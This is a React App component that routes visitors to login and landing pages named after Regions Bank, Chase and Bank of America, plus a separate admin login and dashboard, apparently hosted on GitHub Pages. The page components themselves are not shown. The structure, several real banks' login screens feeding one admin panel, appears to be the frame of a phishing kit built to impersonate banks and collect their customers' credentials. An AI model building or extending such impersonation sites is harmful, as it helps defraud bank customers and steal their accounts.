import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom'
import { useState, useEffect } from 'react'

// Regions Bank
import RegionsLogin from './pages/Login'
import RegionsLanding from './pages/Landing'

// Chase Bank
import ChaseLogin from './pages/ChaseLogin'
import ChaseLanding from './pages/ChaseLanding'

// Bank of America
import BankOfAmericaLogin from './pages/BankOfAmericaLogin'
import BankOfAmericaLanding from './pages/BankOfAmericaLanding'

// Admin
import AdminLogin from './pages/AdminLogin'
import AdminDashboard from './pages/AdminDashboard'

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    // Handle GitHub Pages 404.html redirect
    // The 404.html redirects to /?/path, so we need to convert it back
    const path = window.location.search.slice(1)
    if (path && path.startsWith('/')) {
      const pathParts = path.split('&')
      const newPath = pathParts[0].replace(/~and~/g, '&')
      const newSearch = pathParts.slice(1).join('&').replace(/~and~/g, '&')
      window.history.replaceState(null, '', newPath + (newSearch ? '?' + newSearch : '') + window.location.hash)
    }

    const checkAuth = () => {
      const auth = localStorage.getItem('isAuthenticated')
      const userEmail = localStorage.getItem('userEmail')
      setIsAuthenticated(auth === 'true' && !!userEmail)
      
      const adminAuth = localStorage.getItem('isAdminAuthenticated')
      setIsAdminAuthenticated(adminAuth === 'true')
      
      setLoading(false)
    }

    checkAuth()

    // Listen for storage changes (for logout from other tabs/windows)
    const handleStorageChange = () => {
      checkAuth()
    }

    window.addEventListener('storage', handleStorageChange)
    
    return () => {
      window.removeEventListener('storage', handleStorageChange)
    }
  }, [])

  if (loading) {
    return <div>Loading...</div>
  }

  return (
    <BrowserRouter>
      <Routes>
        {/* Regions Bank Routes */}
        <Route 
          path="/region-bank/login" 
          element={
            isAuthenticated ? <Navigate to="/region-bank" replace /> : <RegionsLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/region-bank" 
          element={
            isAuthenticated ? <RegionsLanding /> : <Navigate to="/region-bank/login" replace />
          } 
        />

        {/* Chase Bank Routes */}
        <Route 
          path="/chase-bank/login" 
          element={
            isAuthenticated ? <Navigate to="/chase-bank" replace /> : <ChaseLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/chase-bank" 
          element={
            isAuthenticated ? <ChaseLanding /> : <Navigate to="/chase-bank/login" replace />
          } 
        />

        {/* Bank of America Routes */}
        <Route 
          path="/bank-of-america/login" 
          element={
            isAuthenticated ? <Navigate to="/bank-of-america" replace /> : <BankOfAmericaLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/bank-of-america" 
          element={
            isAuthenticated ? <BankOfAmericaLanding /> : <Navigate to="/bank-of-america/login" replace />
          } 
        />

        {/* Admin Routes */}
        <Route 
          path="/admin/login" 
          element={
            isAdminAuthenticated ? <Navigate to="/admin" replace /> : <AdminLogin setIsAdminAuthenticated={setIsAdminAuthenticated} />
          } 
        />
        <Route 
          path="/admin" 
          element={
            isAdminAuthenticated ? <AdminDashboard /> : <Navigate to="/admin/login" replace />
          } 
        />

        {/* Default redirect */}
        <Route path="/" element={<Navigate to="/region-bank/login" replace />} />
      </Routes>
    </BrowserRouter>
  )
}

export default App
